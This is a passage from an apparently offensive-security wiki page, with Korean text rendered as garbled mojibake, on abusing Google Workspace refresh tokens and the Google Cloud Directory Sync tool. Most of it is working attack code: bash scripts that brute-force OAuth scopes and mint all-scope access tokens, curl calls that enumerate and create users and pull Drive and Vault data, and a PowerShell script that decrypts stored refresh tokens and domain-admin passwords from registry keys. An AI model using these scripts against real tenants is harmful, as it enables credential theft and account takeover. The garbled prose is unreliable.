--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ê·¸ë¦¬ê³  ì´ê²ƒì€ ì œê°€ ì‘ì„± ë‹¹ì‹œ ë°›ì€ ì¶œë ¥ì…ë‹ˆë‹¤:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
ë˜í•œ, Chromium ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•˜ë©´ [**ì´ íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), ì´ íŒŒì¼ì—ëŠ” **ì´ì „ì— ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ìœ¼ë¡œ ë°œê²¬ë˜ì§€ ì•Šì€ ë‹¤ë¥¸ ë²”ìœ„**ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ëŸ¬í•œ ì¶”ê°€ ë²”ìœ„ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ê°€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>ì¶”ê°€ ë²”ìœ„</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

ê°€ì¥ í¥ë¯¸ë¡œìš´ ê²ƒì€ ì•„ë§ˆë„:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
í•˜ì§€ë§Œ, ì €ëŠ” ì´ ë²”ìœ„ë¥¼ ì‚¬ìš©í•˜ì—¬ gmailì— ì ‘ê·¼í•˜ê±°ë‚˜ ê·¸ë£¹ì„ ë‚˜ì—´í•˜ë ¤ê³  í–ˆì§€ë§Œ ì‘ë™í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ì—¬ì „íˆ ì–¼ë§ˆë‚˜ ìœ ìš©í•œì§€ ëª¨ë¥´ê² ìŠµë‹ˆë‹¤.

**ëª¨ë“  ë²”ìœ„ë¡œ ì•¡ì„¸ìŠ¤ í† í° ê°€ì ¸ì˜¤ê¸°**:

<details>

<summary>ëª¨ë“  ë²”ìœ„ë¡œ refresh_tokenì—ì„œ ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•˜ëŠ” Bash ìŠ¤í¬ë¦½íŠ¸</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

ë‹¤ìŒì€ ì´ëŸ¬í•œ ë²”ìœ„ë¥¼ ì‚¬ìš©í•˜ëŠ” ëª‡ ê°€ì§€ ì˜ˆì…ë‹ˆë‹¤:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault**ëŠ” Gmail, Drive, Chat ë“± Google Workspace ì„œë¹„ìŠ¤ì— ì €ì¥ëœ ì¡°ì§ì˜ ë°ì´í„°ë¥¼ ìœ„í•œ ë°ì´í„° ë³´ì¡´, ê²€ìƒ‰ ë° ë‚´ë³´ë‚´ê¸° ë„êµ¬ë¥¼ ì œê³µí•˜ëŠ” Google Workspaceì˜ ì¶”ê°€ ê¸°ëŠ¥ì…ë‹ˆë‹¤.

* Google Workspace Vaultì˜ **Matter**ëŠ” íŠ¹ì • ì‚¬ê±´, ì¡°ì‚¬ ë˜ëŠ” ë²•ì  ë¬¸ì œì™€ ê´€ë ¨ëœ ëª¨ë“  ì •ë³´ë¥¼ ì¡°ì§í•˜ê³  ê·¸ë£¹í™”í•˜ëŠ” **ì»¨í…Œì´ë„ˆ**ì…ë‹ˆë‹¤. ì´ëŠ” í•´ë‹¹ ë¬¸ì œì™€ ê´€ë ¨ëœ **Holds**, **Searches**, ë° **Exports**ë¥¼ ê´€ë¦¬í•˜ëŠ” ì¤‘ì•™ í—ˆë¸Œ ì—­í• ì„ í•©ë‹ˆë‹¤.
* Google Workspace Vaultì˜ **Hold**ëŠ” íŠ¹ì • ì‚¬ìš©ì ë˜ëŠ” ê·¸ë£¹ì— ì ìš©ë˜ì–´ Google Workspace ì„œë¹„ìŠ¤ ë‚´ì—ì„œ ë°ì´í„°ì˜ **ì‚­ì œ ë˜ëŠ” ë³€ê²½ì„ ë°©ì§€í•˜ëŠ”** **ë³´ì¡´ ì¡°ì¹˜**ì…ë‹ˆë‹¤. HoldsëŠ” ê´€ë ¨ ì •ë³´ê°€ ë²•ì  ì‚¬ê±´ì´ë‚˜ ì¡°ì‚¬ ê¸°ê°„ ë™ì•ˆ ì†ìƒë˜ì§€ ì•Šê³  ìˆ˜ì •ë˜ì§€ ì•Šë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
ë” ë§ì€ [API ì—”ë“œí¬ì¸íŠ¸ëŠ” ë¬¸ì„œì—ì„œ í™•ì¸í•˜ì„¸ìš”](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

ì´ ë„êµ¬ëŠ” **í™œì„± ë””ë ‰í† ë¦¬ ì‚¬ìš©ì ë° ê·¸ë£¹ì„ Workspaceì— ë™ê¸°í™”í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì´ ê¸€ì„ ì‘ì„±í•  ë‹¹ì‹œì—ëŠ” ê·¸ ë°˜ëŒ€ëŠ” ì•„ë‹™ë‹ˆë‹¤).

í¥ë¯¸ë¡œìš´ ì ì€ **Workspace ìŠˆí¼ìœ ì € ë° ê¶Œí•œì´ ìˆëŠ” AD ì‚¬ìš©ì**ì˜ **ìê²© ì¦ëª…**ì´ í•„ìš”í•˜ë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ì ë™ê¸°í™”ë¥¼ ì£¼ê¸°ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ëŠ” ë„ë©”ì¸ ì„œë²„ ë‚´ì—ì„œ ì´ë¥¼ ì°¾ëŠ” ê²ƒì´ ê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
**`config-manager.exe`** ë°”ì´ë„ˆë¦¬ì— ëŒ€í•´ **MitM**ì„ ìˆ˜í–‰í•˜ë ¤ë©´ `config.manager.vmoptions` íŒŒì¼ì— ë‹¤ìŒ ì¤„ì„ ì¶”ê°€í•˜ì„¸ìš”: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ê°€ **GCDS**ë¥¼ ê°ì§€í•˜ê³ , êµ¬ì„±ì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ìœ¼ë©° **ì‹¬ì§€ì–´ ë¹„ë°€ë²ˆí˜¸ì™€ ì•”í˜¸í™”ëœ ìê²© ì¦ëª…**ë„ í™•ì¸í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.
{% endhint %}

ë˜í•œ GCDSëŠ” ADì—ì„œ Workspaceë¡œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë™ê¸°í™”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜¤íˆë ¤ Workspaceì—ì„œ ìƒˆë¡œ ìƒì„±ëœ ì‚¬ìš©ìì— ëŒ€í•´ ë¬´ì‘ìœ„ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìƒì„±í•  ë¿ì…ë‹ˆë‹¤. ë‹¤ìŒ ì´ë¯¸ì§€ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - ë””ìŠ¤í¬ í† í° ë° AD ìê²© ì¦ëª…

ë°”ì´ë„ˆë¦¬ `config-manager.exe` (GUIê°€ ìˆëŠ” ì£¼ìš” GCDS ë°”ì´ë„ˆë¦¬)ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **`C:\Program Files\Google Cloud Directory Sync`** í´ë”ì˜ **`Untitled-1.xml`** íŒŒì¼ì— êµ¬ì„±ëœ Active Directory ìê²© ì¦ëª…, ìƒˆë¡œ ê³ ì¹¨ í† í° ë° ì•¡ì„¸ìŠ¤ë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì‚¬ìš©ì `Documents` ë˜ëŠ” **ë‹¤ë¥¸ í´ë”**ì— ì €ì¥ë  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ê²Œë‹¤ê°€ ë ˆì§€ìŠ¤íŠ¸ë¦¬ **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`**ì˜ **`open.recent`** í‚¤ ì•ˆì—ëŠ” ìµœê·¼ì— ì—´ë¦° ëª¨ë“  êµ¬ì„± íŒŒì¼(xml)ì˜ ê²½ë¡œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ **ì´ë¥¼ í™•ì¸í•˜ì—¬ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

íŒŒì¼ ë‚´ì—ì„œ ê°€ì¥ í¥ë¯¸ë¡œìš´ ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
ì‚¬ìš©ìì˜ **refresh** **token**ê³¼ **password**ëŠ” **AES CBC**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬´ì‘ìœ„ë¡œ ìƒì„±ëœ í‚¤ì™€ IVë¡œ **ì•”í˜¸í™”**ë˜ë©°, **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`**ì— ì €ì¥ë©ë‹ˆë‹¤ (ì—¬ê¸°ì„œ **`prefs`** Java ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ê¸°ë³¸ ì„¤ì •ì„ ì €ì¥í•©ë‹ˆë‹¤). ë¬¸ìì—´ í‚¤ **`/Encryption/Policy/V2.iv`**ì™€ **`/Encryption/Policy/V2.key`**ì— base64ë¡œ ì €ì¥ë©ë‹ˆë‹¤.

<details>

<summary>refresh tokenê³¼ passwordë¥¼ ë³µí˜¸í™”í•˜ëŠ” Powershell ìŠ¤í¬ë¦½íŠ¸</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
